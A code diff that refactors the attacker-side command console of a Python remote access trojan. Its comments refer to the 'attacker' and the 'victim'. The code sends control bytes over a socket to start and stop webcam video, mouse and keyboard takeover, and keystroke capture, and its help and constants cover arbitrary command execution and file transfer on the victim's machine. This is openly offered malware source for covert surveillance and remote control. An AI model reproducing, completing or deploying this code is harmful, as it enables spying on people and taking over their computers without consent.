@@ -1,33 +1,10 @@
+import threading
 from time import sleep
 from shlex import split as shlexSplit
-import socket
-import threading
-
-SERVER_PORT = 8080
-
-# change directory and list directory contents
-CHANGE_DIR = 1
-LIST_DIR = 2
-# upload and download files from/to attacker
-UPLOAD = 3
-DOWNLOAD = 4
-# run an arbitrary comamnd
-RUN_CMD = 5
-# start and end video, mouse, and audio streams
-START_VIDEO = 6
-END_VIDEO = 7
-START_MOUSE = 8
-END_MOUSE = 9
-START_AUDIO = 10
-END_AUDIO = 11
-START_KEYS = 13
-END_KEYS = 14
-# end the process (on the victim's computer)
-KILL_PROC = 12
-# print the rest of the message to provide useful info
-PRINT_INFO = 15
-# inform the attacker what the current directory is
-NEW_CURR_DIR = 16
+# import my stuff
+import utils
+import gui
+from consts import *
 
 # the current directory - printed to console when expecting user input
 currDir = ""
@@ -65,37 +42,8 @@ class mainSockThread (threading.Thread):
 				currDir = str(data[1:], 'UTF-8')
 
 """
-	Create a server socket and listen for an incoming connection
-	Returns the socket associated with the connection
+	Process the command received from user input
 """
-def openConnection(portNum):
-	print(f"Listening for connection on port {portNum} ...")
-
-	# create an IPv4 TCP server socket and set it up to listen
-	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	serversocket.bind(('', portNum))
-	serversocket.listen()
-
-	# listen for incoming connections and accept them
-	(clientsocket, address) = serversocket.accept()
-	print("Connection established")
-
-	# close the server socket and return the socket associated with the connection
-	serversocket.close()
-	return clientsocket
-
-"""
-	 echo messages back to the sender
-	while True:
-		data = clientsocket.recv(4096)
-		if not data:
-			break
-		print(data)
-		data_s = b'ECHO: ' + data + b'\0'
-		print(data_s)
-		clientsocket.sendall(data_s)
-"""
-
 def handleCommand(cmd, mainSock):
 	if cmd.startswith("help"):
 		print("cd [directory] - change current directory")
@@ -147,26 +95,26 @@ def handleCommand(cmd, mainSock):
 			return
 		if args[1] == "start":
 			if args[0] == "video":
-				startVideoStream(mainSock) # this function will send the listening port number
+				gui.toggleVideo(True, mainSock) # tells victim to start video
 			elif args[0] == "audio":
-				startAudioStream(mainSock) # this function will send the listening port number
+				print("TODO - NOT YET IMPLEMENTED")
 			elif args[0] == "mouse":
-				startMouseControl(mainSock) # this function will send the listening port number
+				mainSock.sendall(bytes([START_MOUSE]) + b'\0')
+				gui.toggleMouse(True, mainSock)
 			elif args[0] == "keys":
-				startKeysControl(mainSock) # this function will send the listening port number
+				mainSock.sendall(bytes([START_KEYS]) + b'\0')
+				gui.toggleKeyboard(True, mainSock)
 		elif args[1] == "stop":
 			if args[0] == "video":
-				mainSock.sendall(bytes([END_VIDEO, 0]))
-				# TODO - kill local thread for receiving video stream
+				gui.toggleVideo(False, mainSock) # tells victim to end video, keys, and mouse
 			elif args[0] == "audio":
-				mainSock.sendall(bytes([END_AUDIO, 0]))
-				# TODO - kill local thread for receiving video stream
+				print("TODO - NOT YET IMPLEMENTED")
 			elif args[0] == "mouse":
-				mainSock.sendall(bytes([END_MOUSE, 0]))
-				# TODO - kill local thread for receiving video stream
+				mainSock.sendall(bytes([END_MOUSE]) + b'\0')
+				gui.toggleMouse(False, mainSock)
 			elif args[0] == "keys":
-				mainSock.sendall(bytes([END_KEYS, 0]))
-				# TODO - kill local thread for receiving video stream
+				mainSock.sendall(bytes([END_KEYS]) + b'\0')
+				gui.toggleKeyboard(False, mainSock)
 		else:
 			print("Incorrect command usage! Use \"help\" to see commands")
 	elif cmd == "terminate":
@@ -181,11 +129,13 @@ def main():
 	global currDir
 
 	# establish a connection for sending commands
-	mainSock = openConnection(SERVER_PORT)
+	mainSock = utils.openConnection(SERVER_PORT)
 
 	# start a separate thread to listen for info received on the main socket
+	print("Starting listen thread")
 	mainListenThread = mainSockThread(mainSock)
 	mainListenThread.start()
+	print("Listen thread started")
 
 	# main command loop
 	cmd = input(f"{currDir}>")
